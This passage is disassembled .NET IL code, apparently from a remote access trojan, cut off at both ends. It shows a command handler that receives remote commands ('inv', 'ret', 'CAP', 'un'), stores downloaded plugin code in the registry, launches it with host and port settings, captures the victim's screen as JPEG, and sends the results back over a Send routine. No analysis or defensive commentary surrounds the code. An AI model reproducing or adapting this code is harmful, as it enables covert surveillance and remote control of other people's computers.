        IL_0668:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_066d:  stloc.s    V_17
        IL_066f:  ldloc.s    V_17
        IL_0671:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0676:  ldloc.s    V_17
        IL_0678:  stloc.s    V_18
        IL_067a:  ldstr      "MSG"
        IL_067f:  ldsfld     string j.OK::Y
        IL_0684:  ldstr      "Execute ERROR "
        IL_0689:  ldloc.s    V_18
        IL_068b:  callvirt   instance string [mscorlib]System.Exception::get_Message()
        IL_0690:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_0695:  call       bool j.OK::Send(string)
        IL_069a:  pop
        IL_069b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_06a0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_06a5:  leave      IL_109e

      }  // end handler
      IL_06aa:  ldloc.2
      IL_06ab:  ldstr      "inv"
      IL_06b0:  ldc.i4.0
      IL_06b1:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_06b6:  brfalse.s  IL_06f0

      IL_06b8:  ldloc.2
      IL_06b9:  ldstr      "ret"
      IL_06be:  ldc.i4.0
      IL_06bf:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_06c4:  brfalse    IL_092b

      IL_06c9:  ldloc.2
      IL_06ca:  ldstr      "CAP"
      IL_06cf:  ldc.i4.0
      IL_06d0:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_06d5:  brfalse    IL_0a9c

      IL_06da:  ldloc.2
      IL_06db:  ldstr      "un"
      IL_06e0:  ldc.i4.0
      IL_06e1:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_06e6:  brfalse    IL_0c3e

      IL_06eb:  br         IL_0ca6

      IL_06f0:  ldloc.0
      IL_06f1:  ldc.i4.1
      IL_06f2:  ldelem.ref
      IL_06f3:  ldc.i4.0
      IL_06f4:  newarr     [mscorlib]System.Byte
      IL_06f9:  call       object j.OK::GTV(string,
                                            object)
      IL_06fe:  castclass  uint8[]
      IL_0703:  stloc.s    V_19
      IL_0705:  ldloc.0
      IL_0706:  ldc.i4.3
      IL_0707:  ldelem.ref
      IL_0708:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_070d:  ldc.i4.s   10
      IL_070f:  clt
      IL_0711:  ldloc.s    V_19
      IL_0713:  ldlen
      IL_0714:  conv.i4
      IL_0715:  ldc.i4.0
      IL_0716:  ceq
      IL_0718:  and
      IL_0719:  brfalse.s  IL_0758

      IL_071b:  ldc.i4.5
      IL_071c:  newarr     [mscorlib]System.String
      IL_0721:  dup
      IL_0722:  ldc.i4.0
      IL_0723:  ldstr      "pl"
      IL_0728:  stelem.ref
      IL_0729:  dup
      IL_072a:  ldc.i4.1
      IL_072b:  ldsfld     string j.OK::Y
      IL_0730:  stelem.ref
      IL_0731:  dup
      IL_0732:  ldc.i4.2
      IL_0733:  ldloc.0
      IL_0734:  ldc.i4.1
      IL_0735:  ldelem.ref
      IL_0736:  stelem.ref
      IL_0737:  dup
      IL_0738:  ldc.i4.3
      IL_0739:  ldsfld     string j.OK::Y
      IL_073e:  stelem.ref
      IL_073f:  dup
      IL_0740:  ldc.i4.4
      IL_0741:  ldc.i4.1
      IL_0742:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_0747:  stelem.ref
      IL_0748:  call       string [mscorlib]System.String::Concat(string[])
      IL_074d:  call       bool j.OK::Send(string)
      IL_0752:  pop
      IL_0753:  br         IL_0926

      IL_0758:  ldloc.0
      IL_0759:  ldc.i4.3
      IL_075a:  ldelem.ref
      IL_075b:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0760:  ldc.i4.s   10
      IL_0762:  ble.s      IL_07d1

      IL_0764:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_0769:  stloc.s    V_21
      IL_076b:  ldc.i4.6
      IL_076c:  newarr     [mscorlib]System.String
      IL_0771:  dup
      IL_0772:  ldc.i4.0
      IL_0773:  ldloc.0
      IL_0774:  ldc.i4.0
      IL_0775:  ldelem.ref
      IL_0776:  stelem.ref
      IL_0777:  dup
      IL_0778:  ldc.i4.1
      IL_0779:  ldsfld     string j.OK::Y
      IL_077e:  stelem.ref
      IL_077f:  dup
      IL_0780:  ldc.i4.2
      IL_0781:  ldloc.0
      IL_0782:  ldc.i4.1
      IL_0783:  ldelem.ref
      IL_0784:  stelem.ref
      IL_0785:  dup
      IL_0786:  ldc.i4.3
      IL_0787:  ldsfld     string j.OK::Y
      IL_078c:  stelem.ref
      IL_078d:  dup
      IL_078e:  ldc.i4.4
      IL_078f:  ldloc.0
      IL_0790:  ldc.i4.2
      IL_0791:  ldelem.ref
      IL_0792:  stelem.ref
      IL_0793:  dup
      IL_0794:  ldc.i4.5
      IL_0795:  ldsfld     string j.OK::Y
      IL_079a:  stelem.ref
      IL_079b:  call       string [mscorlib]System.String::Concat(string[])
      IL_07a0:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_07a5:  stloc.s    V_22
      IL_07a7:  ldloc.s    V_21
      IL_07a9:  ldarg.0
      IL_07aa:  ldloc.s    V_22
      IL_07ac:  ldarg.0
      IL_07ad:  ldlen
      IL_07ae:  conv.i4
      IL_07af:  ldloc.s    V_22
      IL_07b1:  sub.ovf
      IL_07b2:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_07b7:  ldloc.s    V_21
      IL_07b9:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_07be:  call       uint8[] j.OK::ZIP(uint8[])
      IL_07c3:  stloc.s    V_19
      IL_07c5:  ldloc.0
      IL_07c6:  ldc.i4.1
      IL_07c7:  ldelem.ref
      IL_07c8:  ldloc.s    V_19
      IL_07ca:  ldc.i4.3
      IL_07cb:  call       bool j.OK::STV(string,
                                          object,
                                          valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_07d0:  pop
      IL_07d1:  ldc.i4.5
      IL_07d2:  newarr     [mscorlib]System.String
      IL_07d7:  dup
      IL_07d8:  ldc.i4.0
      IL_07d9:  ldstr      "pl"
      IL_07de:  stelem.ref
      IL_07df:  dup
      IL_07e0:  ldc.i4.1
      IL_07e1:  ldsfld     string j.OK::Y
      IL_07e6:  stelem.ref
      IL_07e7:  dup
      IL_07e8:  ldc.i4.2
      IL_07e9:  ldloc.0
      IL_07ea:  ldc.i4.1
      IL_07eb:  ldelem.ref
      IL_07ec:  stelem.ref
      IL_07ed:  dup
      IL_07ee:  ldc.i4.3
      IL_07ef:  ldsfld     string j.OK::Y
      IL_07f4:  stelem.ref
      IL_07f5:  dup
      IL_07f6:  ldc.i4.4
      IL_07f7:  ldc.i4.0
      IL_07f8:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_07fd:  stelem.ref
      IL_07fe:  call       string [mscorlib]System.String::Concat(string[])
      IL_0803:  call       bool j.OK::Send(string)
      IL_0808:  pop
      IL_0809:  ldloc.s    V_19
      IL_080b:  ldstr      "A"
      IL_0810:  call       object j.OK::Plugin(uint8[],
                                               string)
      IL_0815:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_081a:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_081f:  stloc.s    V_20
      IL_0821:  ldloc.s    V_20
      IL_0823:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0828:  ldnull
      IL_0829:  ldstr      "h"
      IL_082e:  ldc.i4.1
      IL_082f:  newarr     [mscorlib]System.Object
      IL_0834:  dup
      IL_0835:  ldc.i4.0
      IL_0836:  ldsfld     string j.OK::H
      IL_083b:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::StrReverse(string)
      IL_0840:  stelem.ref
      IL_0841:  ldnull
      IL_0842:  ldnull
      IL_0843:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_0848:  ldloc.s    V_20
      IL_084a:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_084f:  ldnull
      IL_0850:  ldstr      "p"
      IL_0855:  ldc.i4.1
      IL_0856:  newarr     [mscorlib]System.Object
      IL_085b:  dup
      IL_085c:  ldc.i4.0
      IL_085d:  ldsfld     string j.OK::P
      IL_0862:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::StrReverse(string)
      IL_0867:  stelem.ref
      IL_0868:  ldnull
      IL_0869:  ldnull
      IL_086a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_086f:  ldloc.s    V_20
      IL_0871:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0876:  ldnull
      IL_0877:  ldstr      "osk"
      IL_087c:  ldc.i4.1
      IL_087d:  newarr     [mscorlib]System.Object
      IL_0882:  dup
      IL_0883:  ldc.i4.0
      IL_0884:  ldloc.0
      IL_0885:  ldc.i4.2
      IL_0886:  ldelem.ref
      IL_0887:  stelem.ref
      IL_0888:  ldnull
      IL_0889:  ldnull
      IL_088a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_088f:  ldloc.s    V_20
      IL_0891:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0896:  ldnull
      IL_0897:  ldstr      "start"
      IL_089c:  ldc.i4.0
      IL_089d:  newarr     [mscorlib]System.Object
      IL_08a2:  ldnull
      IL_08a3:  ldnull
      IL_08a4:  ldnull
      IL_08a5:  ldc.i4.1
      IL_08a6:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_08ab:  pop
      IL_08ac:  br.s       IL_08b4

      IL_08ae:  ldc.i4.1
      IL_08af:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_08b4:  ldsfld     bool j.OK::Cn
      IL_08b9:  ldc.i4.0
      IL_08ba:  ceq
      IL_08bc:  box        [mscorlib]System.Boolean
      IL_08c1:  ldloc.s    V_20
      IL_08c3:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_08c8:  ldnull
      IL_08c9:  ldstr      "Off"
      IL_08ce:  ldc.i4.0
      IL_08cf:  newarr     [mscorlib]System.Object
      IL_08d4:  ldnull
      IL_08d5:  ldnull
      IL_08d6:  ldnull
      IL_08d7:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_08dc:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_08e1:  ldc.i4.1
      IL_08e2:  box        [mscorlib]System.Boolean
      IL_08e7:  ldc.i4.0
      IL_08e8:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareObjectEqual(object,
                                                                                                                              object,
                                                                                                                              bool)
      IL_08ed:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_08f2:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::OrObject(object,
                                                                                                                    object)
      IL_08f7:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_08fc:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
      IL_0901:  brfalse.s  IL_08ae

      IL_0903:  ldloc.s    V_20
      IL_0905:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_090a:  ldnull
      IL_090b:  ldstr      "off"
      IL_0910:  ldc.i4.1
      IL_0911:  newarr     [mscorlib]System.Object
      IL_0916:  dup
      IL_0917:  ldc.i4.0
      IL_0918:  ldc.i4.1
      IL_0919:  box        [mscorlib]System.Boolean
      IL_091e:  stelem.ref
      IL_091f:  ldnull
      IL_0920:  ldnull
      IL_0921:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_0926:  leave      IL_109e

      IL_092b:  ldloc.0
      IL_092c:  ldc.i4.1
      IL_092d:  ldelem.ref
      IL_092e:  ldc.i4.0
      IL_092f:  newarr     [mscorlib]System.Byte
      IL_0934:  call       object j.OK::GTV(string,
                                            object)
      IL_0939:  castclass  uint8[]
      IL_093e:  stloc.s    V_23
      IL_0940:  ldloc.0
      IL_0941:  ldc.i4.2
      IL_0942:  ldelem.ref
      IL_0943:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0948:  ldc.i4.s   10
      IL_094a:  clt
      IL_094c:  ldloc.s    V_23
      IL_094e:  ldlen
      IL_094f:  conv.i4
      IL_0950:  ldc.i4.0
      IL_0951:  ceq
      IL_0953:  and
      IL_0954:  brfalse.s  IL_0993

      IL_0956:  ldc.i4.5
      IL_0957:  newarr     [mscorlib]System.String
      IL_095c:  dup
      IL_095d:  ldc.i4.0
      IL_095e:  ldstr      "pl"
      IL_0963:  stelem.ref
      IL_0964:  dup
      IL_0965:  ldc.i4.1
      IL_0966:  ldsfld     string j.OK::Y
      IL_096b:  stelem.ref
      IL_096c:  dup
      IL_096d:  ldc.i4.2
      IL_096e:  ldloc.0
      IL_096f:  ldc.i4.1
      IL_0970:  ldelem.ref
      IL_0971:  stelem.ref
      IL_0972:  dup
      IL_0973:  ldc.i4.3
      IL_0974:  ldsfld     string j.OK::Y
      IL_0979:  stelem.ref
      IL_097a:  dup
      IL_097b:  ldc.i4.4
      IL_097c:  ldc.i4.1
      IL_097d:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_0982:  stelem.ref
      IL_0983:  call       string [mscorlib]System.String::Concat(string[])
      IL_0988:  call       bool j.OK::Send(string)
      IL_098d:  pop
      IL_098e:  br         IL_0a97

      IL_0993:  ldloc.0
      IL_0994:  ldc.i4.2
      IL_0995:  ldelem.ref
      IL_0996:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_099b:  ldc.i4.s   10
      IL_099d:  ble.s      IL_09e7

      IL_099f:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_09a4:  ldloc.0
      IL_09a5:  ldc.i4.0
      IL_09a6:  ldelem.ref
      IL_09a7:  ldsfld     string j.OK::Y
      IL_09ac:  ldloc.0
      IL_09ad:  ldc.i4.1
      IL_09ae:  ldelem.ref
      IL_09af:  ldsfld     string j.OK::Y
      IL_09b4:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_09b9:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_09be:  stloc.s    V_25
      IL_09c0:  dup
      IL_09c1:  ldarg.0
      IL_09c2:  ldloc.s    V_25
      IL_09c4:  ldarg.0
      IL_09c5:  ldlen
      IL_09c6:  conv.i4
      IL_09c7:  ldloc.s    V_25
      IL_09c9:  sub.ovf
      IL_09ca:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_09cf:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_09d4:  call       uint8[] j.OK::ZIP(uint8[])
      IL_09d9:  stloc.s    V_23
      IL_09db:  ldloc.0
      IL_09dc:  ldc.i4.1
      IL_09dd:  ldelem.ref
      IL_09de:  ldloc.s    V_23
      IL_09e0:  ldc.i4.3
      IL_09e1:  call       bool j.OK::STV(string,
                                          object,
                                          valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_09e6:  pop
      IL_09e7:  ldc.i4.5
      IL_09e8:  newarr     [mscorlib]System.String
      IL_09ed:  dup
      IL_09ee:  ldc.i4.0
      IL_09ef:  ldstr      "pl"
      IL_09f4:  stelem.ref
      IL_09f5:  dup
      IL_09f6:  ldc.i4.1
      IL_09f7:  ldsfld     string j.OK::Y
      IL_09fc:  stelem.ref
      IL_09fd:  dup
      IL_09fe:  ldc.i4.2
      IL_09ff:  ldloc.0
      IL_0a00:  ldc.i4.1
      IL_0a01:  ldelem.ref
      IL_0a02:  stelem.ref
      IL_0a03:  dup
      IL_0a04:  ldc.i4.3
      IL_0a05:  ldsfld     string j.OK::Y
      IL_0a0a:  stelem.ref
      IL_0a0b:  dup
      IL_0a0c:  ldc.i4.4
      IL_0a0d:  ldc.i4.0
      IL_0a0e:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_0a13:  stelem.ref
      IL_0a14:  call       string [mscorlib]System.String::Concat(string[])
      IL_0a19:  call       bool j.OK::Send(string)
      IL_0a1e:  pop
      IL_0a1f:  ldloc.s    V_23
      IL_0a21:  ldstr      "A"
      IL_0a26:  call       object j.OK::Plugin(uint8[],
                                               string)
      IL_0a2b:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0a30:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0a35:  stloc.s    V_24
      IL_0a37:  ldc.i4.5
      IL_0a38:  newarr     [mscorlib]System.String
      IL_0a3d:  dup
      IL_0a3e:  ldc.i4.0
      IL_0a3f:  ldstr      "ret"
      IL_0a44:  stelem.ref
      IL_0a45:  dup
      IL_0a46:  ldc.i4.1
      IL_0a47:  ldsfld     string j.OK::Y
      IL_0a4c:  stelem.ref
      IL_0a4d:  dup
      IL_0a4e:  ldc.i4.2
      IL_0a4f:  ldloc.0
      IL_0a50:  ldc.i4.1
      IL_0a51:  ldelem.ref
      IL_0a52:  stelem.ref
      IL_0a53:  dup
      IL_0a54:  ldc.i4.3
      IL_0a55:  ldsfld     string j.OK::Y
      IL_0a5a:  stelem.ref
      IL_0a5b:  dup
      IL_0a5c:  ldc.i4.4
      IL_0a5d:  ldloc.s    V_24
      IL_0a5f:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0a64:  ldnull
      IL_0a65:  ldstr      "GT"
      IL_0a6a:  ldc.i4.0
      IL_0a6b:  newarr     [mscorlib]System.Object
      IL_0a70:  ldnull
      IL_0a71:  ldnull
      IL_0a72:  ldnull
      IL_0a73:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_0a78:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0a7d:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_0a82:  stloc.s    V_26
      IL_0a84:  ldloca.s   V_26
      IL_0a86:  call       string j.OK::ENB(string&)
      IL_0a8b:  stelem.ref
      IL_0a8c:  call       string [mscorlib]System.String::Concat(string[])
      IL_0a91:  call       bool j.OK::Send(string)
      IL_0a96:  pop
      IL_0a97:  leave      IL_109e

      IL_0a9c:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_0aa1:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_0aa6:  stloc.s    V_27
      IL_0aa8:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_0aad:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_0ab2:  stloc.s    V_35
      IL_0ab4:  ldloca.s   V_35
      IL_0ab6:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
      IL_0abb:  ldloca.s   V_27
      IL_0abd:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
      IL_0ac2:  ldc.i4     0x21005
      IL_0ac7:  newobj     instance void [System.Drawing]System.Drawing.Bitmap::.ctor(int32,
                                                                                      int32,
                                                                                      valuetype [System.Drawing]System.Drawing.Imaging.PixelFormat)
      IL_0acc:  stloc.s    V_28
      IL_0ace:  ldloc.s    V_28
      IL_0ad0:  call       class [System.Drawing]System.Drawing.Graphics [System.Drawing]System.Drawing.Graphics::FromImage(class [System.Drawing]System.Drawing.Image)
      IL_0ad5:  stloc.s    V_29
      IL_0ad7:  ldloc.s    V_28
      IL_0ad9:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Width()
      IL_0ade:  ldloc.s    V_28
      IL_0ae0:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Height()
      IL_0ae5:  newobj     instance void [System.Drawing]System.Drawing.Size::.ctor(int32,
                                                                                    int32)
      IL_0aea:  stloc.s    V_30
      IL_0aec:  ldloc.s    V_29
      IL_0aee:  ldc.i4.0
      IL_0aef:  ldc.i4.0
      IL_0af0:  ldc.i4.0
      IL_0af1:  ldc.i4.0
      IL_0af2:  ldloc.s    V_30
      IL_0af4:  ldc.i4     0xcc0020
      IL_0af9:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::CopyFromScreen(int32,
                                                                                                 int32,
                                                                                                 int32,
                                                                                                 int32,
                                                                                                 valuetype [System.Drawing]System.Drawing.Size,
                                                                                                 valuetype [System.Drawing]System.Drawing.CopyPixelOperation)
      .try
      {
        IL_0afe:  ldc.i4.s   32
        IL_0b00:  ldc.i4.s   32
        IL_0b02:  newobj     instance void [System.Drawing]System.Drawing.Size::.ctor(int32,
                                                                                      int32)
        IL_0b07:  stloc.s    V_30
        IL_0b09:  call       valuetype [System.Drawing]System.Drawing.Point [System.Windows.Forms]System.Windows.Forms.Cursor::get_Position()
        IL_0b0e:  ldloc.s    V_30
        IL_0b10:  newobj     instance void [System.Drawing]System.Drawing.Rectangle::.ctor(valuetype [System.Drawing]System.Drawing.Point,
                                                                                           valuetype [System.Drawing]System.Drawing.Size)
        IL_0b15:  stloc.s    V_27
        IL_0b17:  call       class [System.Windows.Forms]System.Windows.Forms.Cursor [System.Windows.Forms]System.Windows.Forms.Cursors::get_Default()
        IL_0b1c:  ldloc.s    V_29
        IL_0b1e:  ldloc.s    V_27
        IL_0b20:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.Cursor::Draw(class [System.Drawing]System.Drawing.Graphics,
                                                                                                   valuetype [System.Drawing]System.Drawing.Rectangle)
        IL_0b25:  leave.s    IL_0b42

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0b27:  dup
        IL_0b28:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0b2d:  stloc.s    V_36
        IL_0b2f:  ldloc.s    V_36
        IL_0b31:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0b36:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0b3b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0b40:  leave.s    IL_0b42

      }  // end handler
      IL_0b42:  ldloc.s    V_29
      IL_0b44:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::Dispose()
      IL_0b49:  ldloc.0
      IL_0b4a:  ldc.i4.1
      IL_0b4b:  ldelem.ref
      IL_0b4c:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_0b51:  ldloc.0
      IL_0b52:  ldc.i4.2
      IL_0b53:  ldelem.ref
      IL_0b54:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_0b59:  newobj     instance void [System.Drawing]System.Drawing.Bitmap::.ctor(int32,
                                                                                      int32)
      IL_0b5e:  stloc.s    V_31
      IL_0b60:  ldloc.s    V_31
      IL_0b62:  call       class [System.Drawing]System.Drawing.Graphics [System.Drawing]System.Drawing.Graphics::FromImage(class [System.Drawing]System.Drawing.Image)
      IL_0b67:  stloc.s    V_29
      IL_0b69:  ldloc.s    V_29
      IL_0b6b:  ldloc.s    V_28
      IL_0b6d:  ldc.i4.0
      IL_0b6e:  ldc.i4.0
      IL_0b6f:  ldloc.s    V_31
      IL_0b71:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Width()
      IL_0b76:  ldloc.s    V_31
      IL_0b78:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Height()
      IL_0b7d:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::DrawImage(class [System.Drawing]System.Drawing.Image,
                                                                                            int32,
                                                                                            int32,
                                                                                            int32,
                                                                                            int32)
      IL_0b82:  ldloc.s    V_29
      IL_0b84:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::Dispose()
      IL_0b89:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_0b8e:  stloc.s    V_32
      IL_0b90:  ldstr      "CAP"
      IL_0b95:  ldsfld     string j.OK::Y
      IL_0b9a:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0b9f:  stloc.s    V_26
      IL_0ba1:  ldloca.s   V_26
      IL_0ba3:  call       uint8[] j.OK::SB(string&)
      IL_0ba8:  starg.s    b
      IL_0baa:  ldloc.s    V_32
      IL_0bac:  ldarg.0
      IL_0bad:  ldc.i4.0
      IL_0bae:  ldarg.0
      IL_0baf:  ldlen
      IL_0bb0:  conv.i4
      IL_0bb1:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_0bb6:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_0bbb:  stloc.s    V_33
      IL_0bbd:  ldloc.s    V_31
      IL_0bbf:  ldloc.s    V_33
      IL_0bc1:  call       class [System.Drawing]System.Drawing.Imaging.ImageFormat [System.Drawing]System.Drawing.Imaging.ImageFormat::get_Jpeg()
      IL_0bc6:  callvirt   instance void [System.Drawing]System.Drawing.Image::Save(class [mscorlib]System.IO.Stream,
                                                                                    class [System.Drawing]System.Drawing.Imaging.ImageFormat)
      IL_0bcb:  ldloc.s    V_33
      IL_0bcd:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_0bd2:  call       string j.OK::md5(uint8[])
      IL_0bd7:  stloc.s    V_34
      IL_0bd9:  ldloc.s    V_34
      IL_0bdb:  ldsfld     string j.OK::lastcap
      IL_0be0:  ldc.i4.0
      IL_0be1:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0be6:  brfalse.s  IL_0c08

      IL_0be8:  ldloc.s    V_34
      IL_0bea:  stsfld     string j.OK::lastcap
      IL_0bef:  ldloc.s    V_32
      IL_0bf1:  ldloc.s    V_33
      IL_0bf3:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_0bf8:  ldc.i4.0
      IL_0bf9:  ldloc.s    V_33
      IL_0bfb:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
      IL_0c00:  conv.ovf.i4
      IL_0c01:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_0c06:  br.s       IL_0c10

      IL_0c08:  ldloc.s    V_32
      IL_0c0a:  ldc.i4.0
      IL_0c0b:  callvirt   instance void [mscorlib]System.IO.MemoryStream::WriteByte(uint8)
